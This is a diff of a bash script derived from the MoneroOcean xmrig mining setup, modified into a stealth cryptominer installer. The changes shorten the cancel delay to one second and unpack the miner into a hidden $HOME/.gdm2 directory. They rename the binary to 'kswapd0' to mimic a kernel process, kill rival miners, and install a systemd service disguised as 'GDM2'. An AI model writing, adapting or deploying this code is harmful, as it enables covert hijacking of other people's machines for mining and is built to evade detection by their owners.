@@ -7,7 +7,7 @@ VERSION=2.11
 
 echo "MoneroOcean mining setup script v$VERSION."
 echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
-echo
+
 
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not adviced to run this script under root"
@@ -140,7 +140,7 @@ echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate
 echo
 
 echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
-sleep 15
+sleep 1
 echo
 echo
 
@@ -156,16 +156,17 @@ killall -9 kswapd0
 echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
+rm -rf $HOME/.gdm2
 
-#echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
-#if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
-#  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
-#  exit 1
-#fi
+echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
+  exit 1
+fi
 
-wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
+# wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 
-echo "[*] Unpacking xmrig.tar.gz to $HOME/.moneroocean"
+echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
 [ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
 if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
@@ -193,9 +194,9 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking xmrig.tar.gz to $HOME/.moneroocean"
+  echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
   if ! tar xf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
-    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.moneroocean directory"
+    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
   fi
   rm xmrig.tar.gz
 
@@ -214,7 +215,7 @@ fi
 
 echo "[*] Miner $HOME/.gdm2/xmrig is OK"
 
-mv xmrig kswapd0
+mv $HOME/.gdm2/xmrig $HOME/.gdm2/kswapd0
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -238,6 +239,8 @@ cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
 
 # preparing script
+
+killall xmrig
 
 echo "[*] Creating $HOME/.gdm2/miner.sh script"
 cat >$HOME/.gdm2/miner.sh <<EOL
@@ -280,7 +283,7 @@ else
 
   else
 
-    echo "[*] Creating moneroocean_miner systemd service"
+    echo "[*] Creating moneroocean systemd service"
     cat >gdm2.service <<EOL
 [Unit]
 Description=GDM2
@@ -300,7 +303,7 @@ EOL
     sudo systemctl daemon-reload
     sudo systemctl enable gdm2.service
     sudo systemctl start gdm2.service
-    echo "To see miner service logs run \"sudo journalctl -u moneroocean_miner -f\" command"
+    echo "To see miner service logs run \"sudo journalctl -u gdm2 -f\" command"
   fi
 fi
 
@@ -323,6 +326,3 @@ fi
 echo ""
 
 echo "[*] Setup complete"
-
-
-
